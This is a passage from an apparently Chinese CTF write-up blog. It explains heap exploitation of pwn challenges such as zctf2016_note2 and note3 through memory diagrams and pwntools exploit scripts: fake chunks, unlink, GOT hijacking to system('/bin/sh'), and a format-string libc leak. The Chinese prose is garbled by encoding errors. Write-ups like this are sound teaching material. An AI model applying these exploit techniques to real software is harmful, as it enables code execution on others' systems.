</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> ------------ &lt;- leaked rbp
</span></span><span class=line><span class=cl>|            | 0x20
</span></span><span class=line><span class=cl> ------------ &lt;- rbp
</span></span><span class=line><span class=cl>| shellcode  | 0x30
</span></span><span class=line><span class=cl> ------------ &lt;- shellcode_addr  --
</span></span><span class=line><span class=cl>| 0x20       | id                 |
</span></span><span class=line><span class=cl> ------------                     |
</span></span><span class=line><span class=cl>|            |                    |
</span></span><span class=line><span class=cl> ------------                     |
</span></span><span class=line><span class=cl>| rip        |                    | 0x40
</span></span><span class=line><span class=cl> ------------                     |
</span></span><span class=line><span class=cl>| rbp        |                    |
</span></span><span class=line><span class=cl> ------------                     |
</span></span><span class=line><span class=cl>| dest       |                    |
</span></span><span class=line><span class=cl> ------------ &lt;- fake            --
</span></span><span class=line><span class=cl>| 0x41       |
</span></span><span class=line><span class=cl> ------------
</span></span><span class=line><span class=cl>| prev_size  |
</span></span><span class=line><span class=cl> ------------
</span></span><span class=line><span class=cl>| ...        |
</span></span></code></pre></td></tr></table></div></div><p>ç”±æ­¤å¯ä»¥å¾—åˆ°ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=n>rbp</span><span class=o>-</span><span class=mh>0x50</span>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>rbp</span><span class=o>-</span><span class=mh>0x90</span>
</span></span></code></pre></td></tr></table></div></div><p>ä»è€Œä¼ªé€ å †å—ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;id ~~?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x20</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;money~</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x41</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>fake</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span> <span class=c1># free</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span> <span class=c1># malloc</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;long?&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x30</span><span class=p>))</span> <span class=c1># + 0x10 = 0x40</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;48&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span><span class=p>,</span><span class=n>sc</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=zctf2016_note2>zctf2016_note2</h3><p>æ·»åŠ  note æ—¶ï¼Œå­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œå¯¼è‡´æ·»åŠ å¤§å°ä¸º 0 çš„ noteï¼Œå¯ä»¥è¾“å…¥çš„é•¿åº¦ä¸ºæ— ç¬¦å·çš„ <code>-1</code>ï¼Œå¯ä»¥è®¤ä¸ºæ²¡æœ‰é™åˆ¶ï¼Œä½†æ˜¯ <code>malloc</code> ä¾æ—§ä¼šåˆ†é… <code>0x20</code> å­—èŠ‚ã€‚åˆ©ç”¨è¿™ä¸ªå †æº¢å‡ºï¼Œæˆ‘ä»¬å…ˆåˆ†é…ä¸‰ä¸ª chunkï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>| ...               |               |
</span></span><span class=line><span class=cl> -------------------                |
</span></span><span class=line><span class=cl>| &#39;a&#39;*8             |               |
</span></span><span class=line><span class=cl> ------------------- &lt;- ptr[2]    chunk2
</span></span><span class=line><span class=cl>| size=0x91         |               |
</span></span><span class=line><span class=cl> -------------------                |
</span></span><span class=line><span class=cl>| prev_size         |               |
</span></span><span class=line><span class=cl> ------------------- &lt;---------------
</span></span><span class=line><span class=cl>|                   |               |
</span></span><span class=line><span class=cl> -------------------                |
</span></span><span class=line><span class=cl>| &#39;a&#39;*8             |               |
</span></span><span class=line><span class=cl> ------------------- &lt;- ptr[1]    chunk1
</span></span><span class=line><span class=cl>| size=0x20         |               |
</span></span><span class=line><span class=cl> -------------------                |
</span></span><span class=line><span class=cl>| prev_size         |               |
</span></span><span class=line><span class=cl> ------------------- &lt;---------------
</span></span><span class=line><span class=cl>|                   | 0x18          |
</span></span><span class=line><span class=cl> -------------------                |
</span></span><span class=line><span class=cl>| bp_prev_size=0x60 |               |
</span></span><span class=line><span class=cl> -------------------                |
</span></span><span class=line><span class=cl>| &#39;a&#39;*0x40          | 0x40          |
</span></span><span class=line><span class=cl> -------------------                |
</span></span><span class=line><span class=cl>| fd     | bk       | 0x10          |
</span></span><span class=line><span class=cl> -------------------              chunk0
</span></span><span class=line><span class=cl>| fake_size=0x61    |               |
</span></span><span class=line><span class=cl> -------------------                |
</span></span><span class=line><span class=cl>| fake_prev_size=0  |               |
</span></span><span class=line><span class=cl> ------------------- &lt;- ptr[0]      |
</span></span><span class=line><span class=cl>| size=0x91         |               |
</span></span><span class=line><span class=cl> -------------------                |
</span></span><span class=line><span class=cl>| prev_size         |               |
</span></span><span class=line><span class=cl> ------------------- &lt;---------------
</span></span></code></pre></td></tr></table></div></div><p>æˆ‘ä»¬åœ¨ 0x80 çš„ <code>chunk0</code> å†…ä¼ªé€ äº† 0x61 çš„ chunkï¼Œå¹¶é€šè¿‡ <code>bp_prev_size=0x60</code> ç¡®ä¿èƒ½é€šè¿‡æ£€æŸ¥ã€‚éšååˆ†é…å¤§å°ä¸º <code>0</code> çš„ <code>chunk1</code>ï¼ˆå®é™…å¤§å°ä¸º 0x20ï¼‰ï¼Œç”±äºæ•´æ•°æº¢å‡ºè¿™é‡Œå¯ä»¥è¾“å…¥æ— é™é•¿åº¦çš„å†…å®¹ï¼Œæœ€ååˆ†é… 0x80 çš„ <code>chunk2</code> ç”¨æ¥å¼•èµ· <code>unlink</code>ã€‚</p><p>æ¥ä¸‹æ¥é‡Šæ”¾ 1 å†æ‹¿å›æ¥ï¼Œå°±å¯ä»¥æº¢å‡ºåˆ° <code>chunk2</code>ï¼Œä¿®æ”¹å…¶ <code>prev_size</code> å’Œ <code>chunk_size</code>ï¼Œå‰è€…ä¿®æ”¹ä¸º <code>0x20+0x80=0xa0</code>ï¼Œåè€…ç½® <code>PREV_IN_USE</code> ä½ä¸º <code>0</code>ã€‚è¿™æ ·å†é‡Šæ”¾ 2 å°±å¯ä»¥ <code>unlink</code> æ‰æˆ‘ä»¬çš„ fake chunk äº†ã€‚æ­¤æ—¶ <code>ptr</code> æŒ‡å‘ <code>ptr-0x18</code>ï¼Œå¡«å…… 0x18 å­—èŠ‚åå³å¯ä¿®æ”¹ <code>ptr[0]</code>ï¼Œä¹‹åå°±æ˜¯å¸¸è§„ GOT åŠ«æŒäº†ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=nb>len</span><span class=p>,</span><span class=n>content</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;128)&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;content:&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;note:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=n>choice</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;note:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;]&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>choice</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;note:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;name:&#39;</span><span class=p>,</span><span class=s1>&#39;merc&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;address:&#39;</span><span class=p>,</span><span class=s1>&#39;privacy&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ptr</span> <span class=o>=</span> <span class=mh>0x602120</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>ptr</span><span class=o>-</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>ptr</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>,</span><span class=mh>0x61</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x40</span><span class=p>,</span><span class=mh>0x60</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span> <span class=c1># 0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># 1,0x20</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># 2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># padding,prev_size=0x20+0x80,PREV_IN_USE=0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>,</span><span class=mh>0xa0</span><span class=p>,</span><span class=mh>0x90</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;is&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>atoi</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>atoi</span><span class=p>,</span><span class=s1>&#39;atoi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=zctf2016_note3>zctf2016_note3</h3><p>è¿™é¢˜å’Œä¸Šé¢˜ç±»ä¼¼ï¼Œä¸è¿‡ bss ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>current_ptr
</span></span><span class=line><span class=cl>note0_ptr
</span></span><span class=line><span class=cl>note1_ptr
</span></span><span class=line><span class=cl>note2_ptr
</span></span><span class=line><span class=cl>note3_ptr
</span></span><span class=line><span class=cl>note4_ptr
</span></span><span class=line><span class=cl>note5_ptr
</span></span><span class=line><span class=cl>note6_ptr
</span></span><span class=line><span class=cl>note7_ptr
</span></span><span class=line><span class=cl>note0_size
</span></span><span class=line><span class=cl>note1_size
</span></span><span class=line><span class=cl>note2_size
</span></span><span class=line><span class=cl>note3_size
</span></span><span class=line><span class=cl>note4_size
</span></span><span class=line><span class=cl>note5_size
</span></span><span class=line><span class=cl>note6_size
</span></span><span class=line><span class=cl>note7_size
</span></span></code></pre></td></tr></table></div></div><p>æœ¬é¢˜æ¼æ´åœ¨äº <code>edit</code> æ—¶ä¼šåˆ¤æ–­è¾“å…¥çš„é•¿åº¦æ˜¯å¦å°äº 0ï¼Œå¦‚æœæ˜¯å°±å–ç›¸åæ•°ã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡æ•´æ•°æº¢å‡ºï¼Œè¾“å…¥ <code>0x8000000000000000</code>ï¼Œå®ƒçš„ç›¸åæ•°æ°å¥½æ˜¯å®ƒè‡ªèº«ï¼Œå¹¶ä¸”ä¾ç„¶æ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼ˆ-1ï¼‰ã€‚è¿™æ ·å°±é€ æˆæ•°ç»„è¶Šç•Œï¼Œå¯ä»¥è¦†ç›–åˆ° <code>current_ptr</code>ã€‚</p><p>æˆ‘ä»¬çš„æ€è·¯æ˜¯å…ˆè®© <code>current_ptr</code> æŒ‡å‘ <code>note3</code>ï¼Œç„¶ååˆ©ç”¨è¶Šç•Œè¦†ç›–ä¸€ä¸ª <code>fake_chunk</code> åˆ° <code>note3</code> ä¸Šï¼Œå†é‡Šæ”¾ <code>note4</code> è§¦å‘ unlinkï¼Œæ­¤æ—¶ <code>note3_ptr</code> æŒ‡å‘ <code>note0_ptr</code>ï¼Œè¿™æ ·å°±å¯ä»¥å®ç° GOT åŠ«æŒã€‚</p><p>ä½†æ˜¯æœ¬é¢˜çš„ <code>show</code> åŠŸèƒ½è¢«ç¦ç”¨ï¼Œè€Œæˆ‘ä»¬è¿˜éœ€è¦æ³„éœ² libc åœ°å€ã€‚è¿™é‡Œç”¨çš„æ–¹æ³•æ˜¯åœ¨ bss æ®µç©ºä½™å¤„å†™å…¥ <code>%llx.</code>ï¼Œç„¶åæŠŠ <code>free</code> å…ˆåŠ«æŒåˆ° <code>printf</code>ï¼Œå»æ‰“å°è¿™ä¸€æ®µæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç›¸å½“äºæ‰‹åŠ¨é€ äº†ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚è¿™æ ·å°±å¯ä»¥æ³„éœ²æ ˆä¸Šå†…å®¹ï¼Œä»è€Œæ³„éœ²ä½äºæ ˆä¸Šçš„ <code>__libc_start_main_ret</code> åœ°å€ï¼ˆä¸€èˆ¬ä½äºåç§»é‡ 11 å¤„ï¼‰ã€‚æœ€åæ³„éœ² libc å¾—åˆ° <code>system</code> åœ°å€ï¼Œè¦†ç›– <code>atoi</code> å³å¯ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=nb>len</span><span class=p>,</span><span class=n>content</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;1024)&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;content:&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;note:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;note:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;content:&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;note:&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>negative</span> <span class=o>=</span> <span class=mh>0x8000000000000000</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>add</span><span class=p>(</span><span class=mh>0x200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=mh>0x6020c8</span><span class=o>+</span><span class=mh>0x8</span><span class=o>*</span><span class=mi>3</span><span class=o>-</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=mh>0x6020c8</span><span class=o>+</span><span class=mh>0x8</span><span class=o>*</span><span class=mi>3</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>fake_chunk</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x201</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x200</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_chunk</span> <span class=o>+=</span> <span class=n>flat</span><span class=p>(</span><span class=mh>0x200</span><span class=p>,</span><span class=mh>0x210</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=o>-</span><span class=n>negative</span><span class=p>,</span><span class=n>fake_chunk</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>])</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bss_blank</span> <span class=o>=</span> <span class=mh>0x602100</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>bss_blank</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=s1>&#39;%llx.&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>lsmr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;success&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>)[</span><span class=mi>10</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
